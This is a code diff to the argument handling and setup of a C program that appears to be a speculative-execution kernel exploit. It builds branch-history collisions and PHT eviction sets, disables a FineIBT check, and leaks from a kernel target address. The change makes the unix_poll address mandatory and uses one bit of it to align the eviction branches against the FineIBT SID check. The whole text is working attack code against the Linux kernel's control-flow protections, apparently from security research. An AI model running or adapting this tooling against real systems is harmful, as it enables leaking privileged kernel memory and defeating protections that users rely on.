@@ -218,25 +218,25 @@ int main(int argc, char **argv)
                 break;
             default:
                 printf("Usage:\n"
-                    "%s -t TARGET_BASE [options]\n"
+                    "%s -t TARGET_BASE -u UNIX_POLL [options]\n"
                     "  -t TARGET_BASE     target base address (uuid_string)\n"
+                    "  -u UNIX_POLL       unix_poll address (required for pht eviction set)\n"
                     "  -h HISTORY         a previous found colliding history\n"
                     "  -p PHYS_MAP        the start of the physical map\n"
                     "  -f FAST            Disable FineIBT check during collision finding\n"
-                    "  -u                 unix_poll address (required with -f)\n"
                     , argv[0]);
                 exit(1);
         }
     }
 
-    if (target_base == 0) {
+    if (target_base == 0 || unix_poll_addr == 0) {
         printf("Usage:\n"
-            "%s -t TARGET_BASE [options]\n"
+            "%s -t TARGET_BASE -u UNIX_POLL [options]\n"
             "  -t TARGET_BASE     target base address (uuid_string)\n"
+            "  -u UNIX_POLL       unix_poll address (required for pht eviction set)\n"
             "  -h HISTORY         a previous found colliding history\n"
             "  -p PHYS_MAP        the start of the physical map\n"
             "  -f FAST            Disable FineIBT check during collision finding\n"
-            "  -u                 unix_poll address (required with -f)\n"
             , argv[0]);
         exit(1);
     }
@@ -255,11 +255,6 @@ int main(int argc, char **argv)
     assert(cfg.fd_sock);
 
     if (fast_colliding_phase) {
-
-        if (unix_poll_addr == 0) {
-            printf("Please provide the address of unix_poll (-u)\n");
-            exit(EXIT_FAILURE);
-        }
 
         if (access(PATH_PATCH_INSERT_CHECK, F_OK) == 0) {
             cfg.fd_insert_check = open(PATH_PATCH_INSERT_CHECK, O_WRONLY);
@@ -340,10 +335,14 @@ int main(int argc, char **argv)
     cfg.tfp_leak_target = (uint8_t *) (target_base + TFP_LEAK_TARGET_OFFSET);
     printf(" - TFP_LEAK_TARGET: %p\n", cfg.tfp_leak_target);
 
+    // Get 6h bit of the the target branch to be evicted (fine-ibt sid check)
+    cfg.pht_bit_set = ((unix_poll_addr - 4) & 0x20) >> 5;
+    printf(" - FINE_IBT SID Branch PC[6]: %d\n", cfg.pht_bit_set);
+
 
     for (size_t i = 0; i < NUMBER_OF_EVICT_SETS; i++)
     {
-        cfg.all_pht_cfg[i] =  init_pht_eviction(0);
+        cfg.all_pht_cfg[i] =  init_pht_eviction(cfg.pht_bit_set);
     }
     printf(" - Allocated %d PHT eviction sets\n", NUMBER_OF_EVICT_SETS);
 
@@ -463,7 +462,7 @@ int main(int argc, char **argv)
 
             for (int i = 0; i < NUMBER_OF_EVICT_SETS; i++)
             {
-                randomize_branch_locations(cfg.all_pht_cfg[i], 0);
+                randomize_branch_locations(cfg.all_pht_cfg[i], cfg.pht_bit_set);
             }
 
             memset(hit_rates, 0, sizeof(hit_rates));
